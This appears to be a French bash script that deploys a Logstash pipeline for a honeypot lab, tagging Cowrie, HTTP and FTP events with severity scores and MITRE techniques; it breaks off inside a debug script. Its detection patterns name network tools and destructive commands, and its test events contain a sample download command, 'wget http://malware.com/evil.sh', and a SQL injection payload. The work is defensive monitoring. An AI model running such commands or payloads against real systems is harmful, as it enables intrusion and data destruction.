#!/bin/bash
# SCRIPT HONEYPOT AMÉLIORÉ - Version Optimisée
# Basé sur votre excellent script avec améliorations critiques
# Ajouts : Input Beats, Gestion d'erreurs, Templates ES, Monitoring étendu

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() { echo -e "${GREEN}[+] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
print_error() { echo -e "${RED}[-] $1${NC}"; }
print_info() { echo -e "${BLUE}[i] $1${NC}"; }

if [ "$EUID" -ne 0 ]; then
    print_error "Ce script doit être exécuté en tant que root"
    exit 1
fi

# Vérifier que nous sommes sur la bonne VM
VM_IP=$(ip route get 8.8.8.8 | awk '{print $7}' | head -1)
if [ "$VM_IP" != "192.168.2.124" ]; then
    print_error "Ce script doit être exécuté sur la VM ELK (192.168.2.124)"
    exit 1
fi

echo ""
print_status "=== CONFIGURATION HONEYPOT PIPELINE AMÉLIORÉE ==="
print_info "Basé sur votre script avec améliorations critiques"
print_info "Ajouts : Beats input, Gestion erreurs, Templates ES"
echo ""

# ================================
# 1. BACKUP DE SÉCURITÉ
# ================================
print_status "1. Sauvegarde de sécurité..."
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/opt/logstash-backup-improved-$BACKUP_DATE"
mkdir -p "$BACKUP_DIR"

systemctl stop logstash
sleep 3

cp -r /etc/logstash/conf.d/* "$BACKUP_DIR/" 2>/dev/null || true
print_info "Sauvegarde : $BACKUP_DIR"

# ================================
# 2. SUPPRESSION DES ANCIENS PIPELINES
# ================================
print_status "2. Nettoyage des pipelines existants..."
rm -f /etc/logstash/conf.d/*.conf

# ================================
# 3. PIPELINE AMÉLIORÉ
# ================================
print_status "3. Création du pipeline honeypot amélioré..."

cat > /etc/logstash/conf.d/00-honeypot-improved-pipeline.conf << 'EOF'
# =============================================================================
# PIPELINE HONEYPOT AMÉLIORÉ - INPUTS MULTIPLES
# =============================================================================

input {
  # Port TCP pour envoi direct (votre sender actuel)
  tcp {
    port => 5046
    host => "0.0.0.0"
    codec => json
    type => "honeypot_tcp"
  }
  
  # Port Beats pour Filebeat (étape 6)
  beats {
    port => 5044
    host => "0.0.0.0"
    type => "beats_honeypot"
  }
}

# =============================================================================
# FILTRES INTELLIGENTS AVEC GESTION D'ERREURS
# =============================================================================

filter {
  # ==========================================================================
  # GESTION DES ERREURS JSON (NOUVEAU)
  # ==========================================================================
  if "_jsonparsefailure" in [tags] {
    mutate {
      add_field => { "parse_error" => "true" }
      add_field => { "honeypot_type" => "parse_failed" }
      add_field => { "error_message" => "JSON parsing failed" }
      add_field => { "needs_review" => "true" }
    }
    
    # Essayer de récupérer des infos basiques du message brut
    if [message] {
      # Tentative de détection basique dans le texte brut
      if [message] =~ /cowrie/ {
        mutate { add_field => { "suspected_type" => "cowrie" } }
      } else if [message] =~ /attack/ {
        mutate { add_field => { "suspected_type" => "http" } }
      } else if [message] =~ /ftp/ {
        mutate { add_field => { "suspected_type" => "ftp" } }
      }
    }
  }
  
  # ==========================================================================
  # MÉTADONNÉES COMMUNES (NOUVEAU)
  # ==========================================================================
  mutate {
    add_field => { "[@metadata][processed_by]" => "logstash_improved" }
    add_field => { "[@metadata][processing_timestamp]" => "%{@timestamp}" }
    add_field => { "[@metadata][pipeline_version]" => "2.0" }
  }

  # ==========================================================================
  # DÉTECTION AUTOMATIQUE COWRIE SSH (VOTRE LOGIQUE EXCELLENTE)
  # ==========================================================================
  if [eventid] =~ /^cowrie\./ {
    # DÉTECTÉ : JSON Cowrie natif
    mutate {
      add_field => { "honeypot_type" => "ssh" }
      add_field => { "honeypot_service" => "cowrie" }
      add_field => { "log_format" => "cowrie_native" }
      add_field => { "detection_method" => "eventid_pattern" }
    }
    
    # Parser le timestamp Cowrie (format ISO8601)
    if [timestamp] {
      date {
        match => [ "timestamp", "ISO8601" ]
        target => "@timestamp"
      }
    }
    
    # Renommer les champs pour uniformisation
    if [src_ip] {
      mutate {
        add_field => { "client_ip" => "%{src_ip}" }
        add_field => { "source_ip" => "%{src_ip}" }
      }
    }
    
    if [dst_ip] {
      mutate {
        add_field => { "server_ip" => "%{dst_ip}" }
        add_field => { "destination_ip" => "%{dst_ip}" }
      }
    }
    
    if [session] {
      mutate {
        add_field => { "session_id" => "%{session}" }
      }
    }
    
    # Enrichissement GeoIP (AMÉLIORÉ : Plus de conditions)
    if [src_ip] and [src_ip] != "127.0.0.1" and [src_ip] != "192.168.2.117" and [src_ip] !~ /^192\.168\./ and [src_ip] !~ /^10\./ and [src_ip] !~ /^172\.(1[6-9]|2[0-9]|3[0-1])\./ {
      geoip {
        source => "src_ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
        add_field => { "src_location" => "%{[geoip][latitude]},%{[geoip][longitude]}" }
        add_field => { "geoip_enriched" => "true" }
      }
    }
    
    # Classification des événements par eventid (VOTRE LOGIQUE EXCELLENTE)
    if [eventid] == "cowrie.session.connect" {
      mutate {
        add_field => { "event_category" => "connection" }
        add_field => { "severity_level" => "info" }
        add_field => { "alert_score" => "3" }
        add_field => { "mitre_technique" => "T1021.004" }  # Remote Services: SSH
        add_field => { "mitre_tactic" => "Initial Access" }
      }
    }
    
    else if [eventid] == "cowrie.login.success" {
      mutate {
        add_field => { "event_category" => "authentication_success" }
        add_field => { "severity_level" => "critical" }
        add_field => { "alert_score" => "10" }
        add_field => { "mitre_technique" => "T1078" }  # Valid Accounts
        add_field => { "mitre_tactic" => "Initial Access" }
        add_field => { "requires_immediate_attention" => "true" }
      }
      
      # Extraire username/password si disponibles
      if [username] {
        mutate { add_field => { "login_username" => "%{username}" } }
      }
      if [password] {
        mutate { add_field => { "login_password" => "%{password}" } }
      }
    }
    
    else if [eventid] == "cowrie.login.failed" {
      mutate {
        add_field => { "event_category" => "authentication_failure" }
        add_field => { "severity_level" => "medium" }
        add_field => { "alert_score" => "5" }
        add_field => { "mitre_technique" => "T1110" }  # Brute Force
        add_field => { "mitre_tactic" => "Credential Access" }
      }
    }
    
    else if [eventid] == "cowrie.command.input" {
      mutate {
        add_field => { "event_category" => "command_execution" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "8" }
        add_field => { "mitre_technique" => "T1059" }  # Command and Scripting Interpreter
        add_field => { "mitre_tactic" => "Execution" }
      }
      
      # Analyser les commandes suspectes (VOTRE LOGIQUE EXCELLENTE)
      if [input] {
        mutate { add_field => { "command_executed" => "%{input}" } }
        
        if [input] =~ /(?i)(wget|curl|nc|netcat|nmap)/ {
          mutate {
            add_field => { "suspicious_command" => "true" }
            add_field => { "command_type" => "network_tool" }
            add_field => { "alert_score" => "9" }
          }
        }
        
        if [input] =~ /(?i)(rm -rf|dd if=|mkfs|fdisk|format)/ {
          mutate {
            add_field => { "suspicious_command" => "true" }
            add_field => { "command_type" => "destructive" }
            add_field => { "alert_score" => "10" }
            add_field => { "requires_immediate_attention" => "true" }
          }
        }
        
        if [input] =~ /(?i)(cat|ls|pwd|whoami|id|uname)/ {
          mutate {
            add_field => { "command_type" => "reconnaissance" }
          }
        }
        
        # NOUVEAU : Détection de téléchargements
        if [input] =~ /(?i)(wget|curl).*\.(sh|py|pl|exe|bin)/ {
          mutate {
            add_field => { "malware_download_attempt" => "true" }
            add_field => { "alert_score" => "10" }
          }
        }
      }
    }
    
    else if [eventid] == "cowrie.client.version" {
      mutate {
        add_field => { "event_category" => "client_identification" }
        add_field => { "severity_level" => "info" }
        add_field => { "alert_score" => "2" }
      }
      
      if [version] {
        mutate { add_field => { "ssh_client_version" => "%{version}" } }
      }
    }
    
    else if [eventid] == "cowrie.session.closed" {
      mutate {
        add_field => { "event_category" => "disconnection" }
        add_field => { "severity_level" => "info" }
        add_field => { "alert_score" => "1" }
      }
      
      if [duration] {
        mutate { add_field => { "session_duration" => "%{duration}" } }
      }
    }
  }

  # ==========================================================================
  # DÉTECTION AUTOMATIQUE HTTP HONEYPOT (VOTRE LOGIQUE EXCELLENTE + AMÉLIORATIONS)
  # ==========================================================================
  else if [attack_id] and [attack_type] {
    # DÉTECTÉ : JSON HTTP Honeypot natif
    mutate {
      add_field => { "honeypot_type" => "http" }
      add_field => { "honeypot_service" => "http_honeypot" }
      add_field => { "log_format" => "http_native" }
      add_field => { "detection_method" => "attack_id_pattern" }
    }
    
    # Parser le timestamp HTTP
    if [timestamp] {
      date {
        match => [ "timestamp", "ISO8601" ]
        target => "@timestamp"
      }
    }
    
    # Renommer les champs pour uniformisation
    if [ip] {
      mutate {
        add_field => { "client_ip" => "%{ip}" }
        add_field => { "source_ip" => "%{ip}" }
      }
    }
    
    # Enrichissement GeoIP pour HTTP (AMÉLIORÉ)
    if [ip] and [ip] != "127.0.0.1" and [ip] != "192.168.2.117" and [ip] !~ /^192\.168\./ and [ip] !~ /^10\./ and [ip] !~ /^172\.(1[6-9]|2[0-9]|3[0-1])\./ {
      geoip {
        source => "ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
        add_field => { "src_location" => "%{[geoip][latitude]},%{[geoip][longitude]}" }
        add_field => { "geoip_enriched" => "true" }
      }
    }
    
    # Classification des attaques HTTP par type (VOTRE LOGIQUE EXCELLENTE)
    if [attack_type] == "sql_injection" {
      mutate {
        add_field => { "event_category" => "web_attack" }
        add_field => { "severity_level" => "critical" }
        add_field => { "alert_score" => "9" }
        add_field => { "mitre_technique" => "T1190" }  # Exploit Public-Facing Application
        add_field => { "mitre_tactic" => "Initial Access" }
        add_field => { "owasp_category" => "A03_Injection" }
      }
    }
    
    else if [attack_type] == "api_access" {
      mutate {
        add_field => { "event_category" => "api_enumeration" }
        add_field => { "severity_level" => "low" }
        add_field => { "alert_score" => "3" }
        add_field => { "mitre_technique" => "T1083" }  # File and Directory Discovery
        add_field => { "mitre_tactic" => "Discovery" }
      }
    }
    
    else if [attack_type] == "sql_error" {
      mutate {
        add_field => { "event_category" => "web_error" }
        add_field => { "severity_level" => "medium" }
        add_field => { "alert_score" => "5" }
        add_field => { "mitre_technique" => "T1190" }
      }
    }
    
    else if [attack_type] == "xss" {
      mutate {
        add_field => { "event_category" => "web_attack" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "7" }
        add_field => { "owasp_category" => "A07_XSS" }
      }
    }
    
    # NOUVEAU : Plus de types d'attaques
    else if [attack_type] == "path_traversal" {
      mutate {
        add_field => { "event_category" => "web_attack" }
        add_field => { "severity_level" => "high" }
        add_field => { "alert_score" => "8" }
        add_field => { "owasp_category" => "A01_Broken_Access" }
      }
    }
    
    else if [attack_type] == "command_injection" {
      mutate {
        add_field => { "event_category" => "web_attack" }
        add_field => { "severity_level" => "critical" }
        add_field => { "alert_score" => "10" }
        add_field => { "requires_immediate_attention" => "true" }
      }
    }
    
    # Mapping de sévérité si défini dans les logs
    if [severity] {
      if [severity] == "critical" {
        mutate { add_field => { "alert_score" => "10" } }
      } else if [severity] == "high" {
        mutate { add_field => { "alert_score" => "8" } }
      } else if [severity] == "medium" {
        mutate { add_field => { "alert_score" => "5" } }
      } else if [severity] == "low" {
        mutate { add_field => { "alert_score" => "2" } }
      }
    }
    
    # Analyse User-Agent (VOTRE LOGIQUE EXCELLENTE + AMÉLIORATIONS)
    if [user_agent] {
      if [user_agent] =~ /(?i)(bot|crawler|spider|scanner|nikto|sqlmap|nmap|masscan)/ {
        mutate {
          add_field => { "client_type" => "security_scanner" }
          add_field => { "alert_score" => "8" }
          add_field => { "automated_attack" => "true" }
        }
      } else if [user_agent] =~ /(?i)(curl|wget|python|powershell|go-http)/ {
        mutate {
          add_field => { "client_type" => "script" }
          add_field => { "alert_score" => "6" }
          add_field => { "automated_attack" => "true" }
        }
      } else if [user_agent] =~ /(?i)(mozilla|chrome|firefox|safari|edge)/ {
        mutate {
          add_field => { "client_type" => "browser" }
        }
      }
    }
    
    # Analyse des méthodes HTTP suspectes
    if [method] {
      if [method] in ["PUT", "DELETE", "PATCH"] {
        mutate {
          add_field => { "suspicious_method" => "true" }
          add_field => { "alert_score" => "6" }
        }
      } else if [method] in ["TRACE", "CONNECT", "OPTIONS"] {
        mutate {
          add_field => { "recon_method" => "true" }
          add_field => { "alert_score" => "4" }
        }
      }
    }
    
    # Analyse des chemins suspects (VOTRE LOGIQUE + AMÉLIORATIONS)
    if [url] or [path] {
      ruby {
        code => "
          path = event.get('url') || event.get('path') || ''
          
          if path =~ /(?i)(admin|phpmyadmin|wp-admin|login|config|\.env|\.git|backup)/
            event.set('suspicious_path', 'true')
            event.set('path_type', 'sensitive')
          end
          
          if path =~ /(?i)(\.\.\/|%2e%2e|%252e|\.\.%2f|\.\.%5c)/
            event.set('directory_traversal', 'true')
            event.set('alert_score', 9)
            event.set('mitre_technique', 'T1083')
          end
          
          if path =~ /(?i)(eval|exec|system|shell_exec|passthru)/
            event.set('code_injection_attempt', 'true')
            event.set('alert_score', 10)
          end
        "
      }
    }
  }

  # ==========================================================================
  # DÉTECTION FORMAT FTP (VOTRE LOGIQUE CONSERVÉE)
  # ==========================================================================
  else if [honeypot_type] == "ftp" {
    # FTP fonctionne déjà - garder la logique existante
    if [log_format] == "ftp_json" and [event_type] {
      mutate {
        add_field => { "honeypot_service" => "ftp_honeypot" }
        add_field => { "detection_method" => "explicit_ftp_type" }
      }
      
      # Enrichissement GeoIP pour FTP (AMÉLIORÉ)
      if [ip] and [ip] != "127.0.0.1" and [ip] !~ /^192\.168\./ {
        geoip {
          source => "ip"
          target => "geoip"
          add_field => { "src_country" => "%{[geoip][country_name]}" }
          add_field => { "src_city" => "%{[geoip][city_name]}" }
          add_field => { "geoip_enriched" => "true" }
        }
      }
      
      # Classification FTP
      if [event_type] == "ftp_command" {
        mutate {
          add_field => { "event_category" => "ftp_command" }
          add_field => { "severity_level" => "medium" }
          add_field => { "alert_score" => "4" }
        }
      } else if [event_type] == "brute_force_detected" {
        mutate {
          add_field => { "event_category" => "ftp_bruteforce" }
          add_field => { "severity_level" => "high" }
          add_field => { "alert_score" => "8" }
          add_field => { "mitre_technique" => "T1110" }
        }
      }
    }
    
    else if [log_format] == "ftp_text" {
      # FTP texte parsé par le sender
      if [action] =~ /(?i)success/ {
        mutate {
          add_field => { "event_category" => "ftp_success" }
          add_field => { "severity_level" => "low" }
          add_field => { "alert_score" => "2" }
        }
      } else if [action] =~ /(?i)fail/ {
        mutate {
          add_field => { "event_category" => "ftp_failure" }
          add_field => { "severity_level" => "medium" }
          add_field => { "alert_score" => "5" }
        }
      }
      
      # Alias IP pour FTP
      if [ip] and ![client_ip] {
        mutate { add_field => { "client_ip" => "%{ip}" } }
      }
    }
  }

  # ==========================================================================
  # ENRICHISSEMENTS COMMUNS AMÉLIORÉS
  # ==========================================================================
  
  # Calcul du score de risque global basé sur alert_score (VOTRE LOGIQUE EXCELLENTE)
  if [alert_score] {
    ruby {
      code => "
        score = event.get('alert_score').to_i
        if score >= 9
          event.set('risk_level', 'critical')
        elsif score >= 7
          event.set('risk_level', 'high')
        elsif score >= 5
          event.set('risk_level', 'medium')
        elsif score >= 3
          event.set('risk_level', 'low')
        else
          event.set('risk_level', 'info')
        end
      "
    }
  }
  
  # Standardiser les champs IP pour tous les types
  if [src_ip] and ![client_ip] {
    mutate { add_field => { "client_ip" => "%{src_ip}" } }
  }
  
  if [ip] and ![client_ip] {
    mutate { add_field => { "client_ip" => "%{ip}" } }
  }
  
  # NOUVEAU : Détection d'IP répétées (simple)
  if [client_ip] {
    ruby {
      code => "
        ip = event.get('client_ip')
        # Marquer les IPs privées
        if ip =~ /^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|127\.)/
          event.set('ip_type', 'private')
        else
          event.set('ip_type', 'public')
        end
      "
    }
  }
  
  # Ajouter métadonnées de détection AMÉLIORÉES
  mutate {
    add_field => { "infrastructure" => "honeypot" }
    add_field => { "vm_source" => "192.168.2.117" }
    add_field => { "vm_destination" => "192.168.2.124" }
    add_field => { "processed_timestamp" => "%{@timestamp}" }
  }
  
  # NOUVEAU : Métadonnées temporelles
  ruby {
    code => "
      timestamp = event.get('@timestamp')
      if timestamp
        event.set('hour_of_day', timestamp.hour)
        event.set('day_of_week', timestamp.wday)
        event.set('is_weekend', timestamp.wday == 0 || timestamp.wday == 6)
        
        # Classification par période
        case timestamp.hour
        when 0..5
          event.set('time_period', 'night')
        when 6..11
          event.set('time_period', 'morning')
        when 12..17
          event.set('time_period', 'afternoon')
        when 18..23
          event.set('time_period', 'evening')
        end
      end
    "
  }
  
  # Nettoyer les champs temporaires (AMÉLIORÉ)
  mutate {
    remove_field => [ "host", "port", "[@metadata][beat]", "[@metadata][type]", "[@metadata][version]" ]
  }
}

# =============================================================================
# OUTPUTS AVEC TEMPLATES (NOUVEAU)
# =============================================================================

output {
  # Output pour SSH Cowrie avec template
  if [honeypot_type] == "ssh" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-cowrie-%{+YYYY.MM.dd}"
      template_name => "honeypot-cowrie"
    }
  }
  
  # Output pour HTTP avec template
  else if [honeypot_type] == "http" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-http-%{+YYYY.MM.dd}"
      template_name => "honeypot-http"
    }
  }
  
  # Output pour FTP avec template
  else if [honeypot_type] == "ftp" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-ftp-%{+YYYY.MM.dd}"
      template_name => "honeypot-ftp"
    }
  }
  
  # NOUVEAU : Output pour erreurs de parsing
  else if [parse_error] == "true" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-errors-%{+YYYY.MM.dd}"
    }
  }
  
  # Fallback pour logs non identifiés
  else {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-unknown-%{+YYYY.MM.dd}"
    }
  }
  
  # NOUVEAU : Output conditionnel pour alertes critiques
  if [requires_immediate_attention] == "true" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-critical-alerts-%{+YYYY.MM.dd}"
    }
  }
  
  # Debug optionnel (décommentez si nécessaire)
  # stdout { codec => rubydebug }
}
EOF

print_status "✅ Pipeline amélioré créé"

# ================================
# 4. CONFIGURATION LOGSTASH.YML OPTIMISÉE
# ================================
print_status "4. Configuration Logstash optimisée..."

cat > /etc/logstash/logstash.yml << 'EOF'
# Configuration Logstash optimisée pour honeypots
node.name: "logstash-honeypot-improved"
path.data: /var/lib/logstash
path.logs: /var/log/logstash
path.settings: /etc/logstash

# Configuration pipeline optimisée
pipeline.workers: 2
pipeline.batch.size: 250
pipeline.batch.delay: 50
pipeline.unsafe_shutdown: false

# Configuration réseau
http.host: "192.168.2.124"
http.port: 9600

# Logs améliorés
log.level: info
slowlog.threshold.warn: 2s
slowlog.threshold.info: 1s

# Monitoring
xpack.monitoring.enabled: false
xpack.management.enabled: false

# Optimisations mémoire
pipeline.ecs_compatibility: disabled
EOF

# ================================
# 5. PERMISSIONS ET VALIDATION
# ================================
print_status "5. Configuration des permissions..."
chown -R logstash:logstash /etc/logstash/
chmod 644 /etc/logstash/conf.d/*.conf
chmod 644 /etc/logstash/logstash.yml

# ================================
# 7. DÉMARRAGE DE LOGSTASH
# ================================
print_status "7. Démarrage de Logstash amélioré..."
systemctl start logstash

# Attendre le démarrage avec monitoring
print_info "Attente du démarrage (60s max)..."
counter=0
while [ $counter -lt 60 ]; do
    if systemctl is-active --quiet logstash; then
        print_status "✅ Logstash démarré"
        break
    fi
    if [ $((counter % 10)) -eq 0 ]; then
        echo "Attente... ${counter}s"
    fi
    sleep 2
    counter=$((counter + 2))
done

if ! systemctl is-active --quiet logstash; then
    print_error "❌ Échec du démarrage de Logstash"
    journalctl -u logstash --no-pager -n 10
    exit 1
fi

# ================================
# 8. VÉRIFICATIONS AMÉLIORÉES
# ================================
print_status "8. Vérifications des améliorations..."

# Service actif
if systemctl is-active --quiet logstash; then
    print_status "✅ Service Logstash actif"
else
    print_error "❌ Service non actif"
    exit 1
fi

# Attendre l'ouverture des ports
sleep 15

# Vérifier les deux ports
PORT_5046_OK=false
PORT_5044_OK=false

if netstat -tlnp | grep -q ":5046"; then
    print_status "✅ Port 5046 (TCP honeypot) en écoute"
    PORT_5046_OK=true
else
    print_warning "⚠️ Port 5046 pas encore ouvert"
fi

if netstat -tlnp | grep -q ":5044"; then
    print_status "✅ Port 5044 (Beats/Filebeat) en écoute"
    PORT_5044_OK=true
else
    print_warning "⚠️ Port 5044 pas encore ouvert"
fi

# API Logstash
if curl -s "http://localhost:9600/" | grep -q "ok"; then
    print_status "✅ API Logstash accessible"
else
    print_warning "⚠️ API Logstash pas encore disponible"
fi

# ================================
# 9. SCRIPTS DE TEST AMÉLIORÉS
# ================================
print_status "9. Création des scripts de test améliorés..."

# Script de test complet
cat > /opt/test_honeypot_improved.sh << 'TEST_EOF'
#!/bin/bash
echo "=== TEST PIPELINE HONEYPOT AMÉLIORÉ ==="
echo ""

echo "🔧 Status Infrastructure:"
echo "   Logstash: $(systemctl is-active logstash)"
echo "   Port 5046 (TCP): $(netstat -tln | grep :5046 >/dev/null && echo 'OK' || echo 'NOK')"
echo "   Port 5044 (Beats): $(netstat -tln | grep :5044 >/dev/null && echo 'OK' || echo 'NOK')"
echo "   API: $(curl -s "http://localhost:9600/" | grep -q ok && echo 'OK' || echo 'NOK')"
echo ""

echo "🧪 Test détection automatique améliorée:"
echo ""

# Test Cowrie avec plus de détails
echo "📡 Test JSON Cowrie natif (connexion)..."
echo '{"eventid":"cowrie.session.connect","src_ip":"203.0.113.100","dst_ip":"192.168.2.117","session":"test_improved_123","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","version":"SSH-2.0-OpenSSH_7.4","message":"New connection"}' | nc -w 2 localhost 5046 2>/dev/null
echo "   ✅ Test connexion SSH envoyé"

echo "📡 Test JSON Cowrie natif (login failed)..."
echo '{"eventid":"cowrie.login.failed","src_ip":"203.0.113.100","username":"admin","password":"123456","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","session":"test_improved_123"}' | nc -w 2 localhost 5046 2>/dev/null
echo "   ✅ Test login failed envoyé"

echo "📡 Test JSON Cowrie natif (commande suspecte)..."
echo '{"eventid":"cowrie.command.input","src_ip":"203.0.113.100","input":"wget http://malware.com/evil.sh","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","session":"test_improved_123"}' | nc -w 2 localhost 5046 2>/dev/null
echo "   ✅ Test commande suspecte envoyé"

sleep 2

# Test HTTP avec plus de variété
echo "📡 Test JSON HTTP natif (SQL Injection)..."
echo '{"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","attack_id":"test_improved_001","attack_type":"sql_injection","severity":"critical","ip":"203.0.113.101","method":"POST","url":"/login","user_agent":"sqlmap/1.0","payload":"admin'\'' OR 1=1--"}' | nc -w 2 localhost 5046 2>/dev/null
echo "   ✅ Test SQL injection envoyé"

echo "📡 Test JSON HTTP natif (Scanner Detection)..."
echo '{"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","attack_id":"test_improved_002","attack_type":"api_access","ip":"203.0.113.102","method":"GET","url":"/admin/config.php","user_agent":"Nikto/2.1.6"}' | nc -w 2 localhost 5046 2>/dev/null
echo "   ✅ Test scanner détection envoyé"

sleep 2

# Test FTP (format existant conservé)
echo "📡 Test JSON FTP (format existant)..."
echo '{"honeypot_type":"ftp","log_format":"ftp_json","event_type":"brute_force_detected","ip":"203.0.113.103","username":"admin","attempts":25,"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'"}' | nc -w 2 localhost 5046 2>/dev/null
echo "   ✅ Test FTP brute force envoyé"

# Test erreur JSON (nouveau)
echo "📡 Test gestion erreurs JSON..."
echo 'this is not valid json and should be handled gracefully' | nc -w 2 localhost 5046 2>/dev/null
echo "   ✅ Test erreur JSON envoyé"

echo ""
echo "⏱️ Attente indexation (10s)..."
sleep 10

echo ""
echo "📊 Vérification indices (améliorés):"
curl -s "http://192.168.2.124:9200/_cat/indices/honeypot-*?v&s=index" 2>/dev/null || echo "   Indices pas encore créés"

echo ""
echo "🔢 Comptage documents par type:"
for type in cowrie http ftp errors unknown critical-alerts; do
    count=$(curl -s "http://192.168.2.124:9200/honeypot-$type-*/_count" 2>/dev/null | jq -r '.count // 0')
    echo "   $type: $count documents"
done

echo ""
echo "🚨 Alertes critiques récentes:"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?q=requires_immediate_attention:true&size=3&sort=@timestamp:desc&_source=@timestamp,honeypot_type,event_category,alert_score,client_ip" 2>/dev/null | jq -r '.hits.hits[]._source | "\(.@timestamp) - \(.honeypot_type) - \(.event_category) - Score:\(.alert_score) - \(.client_ip)"' 2>/dev/null || echo "   Aucune alerte critique"

echo ""
echo "🔍 Enrichissements GeoIP:"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?q=geoip_enriched:true&size=1&_source=client_ip,src_country,src_city" 2>/dev/null | jq -r '.hits.hits[]._source | "\(.client_ip) - \(.src_country) - \(.src_city)"' 2>/dev/null || echo "   Pas encore d'enrichissement GeoIP"

echo ""
echo "📈 Méthodes de détection:"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?size=0&aggs={\"detection_methods\":{\"terms\":{\"field\":\"detection_method.keyword\"}}}" 2>/dev/null | jq -r '.aggregations.detection_methods.buckets[] | "   \(.key): \(.doc_count)"' 2>/dev/null || echo "   Pas de données"

echo ""
echo "🔍 Derniers logs Logstash:"
journalctl -u logstash --no-pager -n 3
TEST_EOF

chmod +x /opt/test_honeypot_improved.sh

# Script de monitoring avancé
cat > /opt/monitor_honeypot_improved.sh << 'MONITOR_EOF'
#!/bin/bash
echo "=== MONITORING HONEYPOT PIPELINE AMÉLIORÉ ==="
echo ""

echo "📊 INFRASTRUCTURE:"
echo "   Logstash: $(systemctl is-active logstash)"
echo "   Uptime: $(systemctl show logstash --property=ActiveEnterTimestamp --value | cut -d' ' -f2-3)"
echo "   Memory: $(ps -o pid,ppid,cmd,%mem --sort=-%mem | grep logstash | head -1 | awk '{print $4"%"}' || echo 'N/A')"
echo ""

echo "🔗 PORTS ET CONNEXIONS:"
echo "   TCP 5046: $(netstat -tln | grep :5046 | wc -l) listeners"
echo "   Beats 5044: $(netstat -tln | grep :5044 | wc -l) listeners"
echo "   API 9600: $(curl -s http://localhost:9600/ | jq -r .status 2>/dev/null || echo 'Non accessible')"
echo ""

echo "📊 INDICES HONEYPOT:"
curl -s "http://192.168.2.124:9200/_cat/indices/honeypot-*?v&s=index&h=index,docs.count,store.size" 2>/dev/null || echo "Aucun indice trouvé"
echo ""

echo "🔢 RÉPARTITION PAR TYPE:"
total=0
for type in cowrie http ftp errors unknown critical-alerts; do
    count=$(curl -s "http://192.168.2.124:9200/honeypot-$type-*/_count" 2>/dev/null | jq -r '.count // 0')
    total=$((total + count))
    echo "   $type: $count documents"
done
echo "   TOTAL: $total documents"
echo ""

echo "🚨 NIVEAUX DE RISQUE:"
for level in critical high medium low info; do
    count=$(curl -s "http://192.168.2.124:9200/honeypot-*/_search?q=risk_level:$level&size=0" 2>/dev/null | jq -r '.hits.total.value // 0')
    echo "   $level: $count événements"
done
echo ""

echo "🌍 TOP 5 PAYS SOURCES:"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?size=0&aggs={\"countries\":{\"terms\":{\"field\":\"src_country.keyword\",\"size\":5}}}" 2>/dev/null | jq -r '.aggregations.countries.buckets[] | "   \(.key): \(.doc_count)"' 2>/dev/null || echo "   Pas de données géographiques"
echo ""

echo "🔍 TECHNIQUES MITRE ATT&CK DÉTECTÉES:"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?size=0&aggs={\"techniques\":{\"terms\":{\"field\":\"mitre_technique.keyword\",\"size\":5}}}" 2>/dev/null | jq -r '.aggregations.techniques.buckets[] | "   \(.key): \(.doc_count)"' 2>/dev/null || echo "   Pas de données MITRE"
echo ""

echo "🚨 ALERTES CRITIQUES (dernières 24h):"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?q=requires_immediate_attention:true AND @timestamp:[now-24h TO now]&size=5&sort=@timestamp:desc&_source=@timestamp,honeypot_type,event_category,client_ip,alert_score" 2>/dev/null | jq -r '.hits.hits[]._source | "\(.@timestamp) - \(.honeypot_type) - \(.event_category) - \(.client_ip) - Score:\(.alert_score)"' 2>/dev/null || echo "   Aucune alerte critique récente"
echo ""

echo "📈 STATS PIPELINE LOGSTASH:"
curl -s "http://192.168.2.124:9600/_node/stats/pipelines" 2>/dev/null | jq -r '.pipelines.main.events | "   Events: in=\(.in), out=\(.out), filtered=\(.filtered), duration=\(.duration_in_millis)ms"' 2>/dev/null || echo "   Stats non disponibles"
echo ""

echo "🕒 ACTIVITÉ PAR HEURE (dernières 24h):"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?size=0&aggs={\"activity\":{\"date_histogram\":{\"field\":\"@timestamp\",\"calendar_interval\":\"hour\"}}}" 2>/dev/null | jq -r '.aggregations.activity.buckets[-24:] | .[] | "\(.key_as_string): \(.doc_count) événements"' 2>/dev/null | tail -5 || echo "   Pas de données temporelles"
MONITOR_EOF

chmod +x /opt/monitor_honeypot_improved.sh

# Script de dépannage
cat > /opt/debug_honeypot_pipeline.sh << 'DEBUG_EOF'
#!/bin/bash
echo "=== DEBUG HONEYPOT PIPELINE ==="
echo ""

echo "🔧 DIAGNOSTIC COMPLET:"
echo ""

echo "1. SERVICES:"
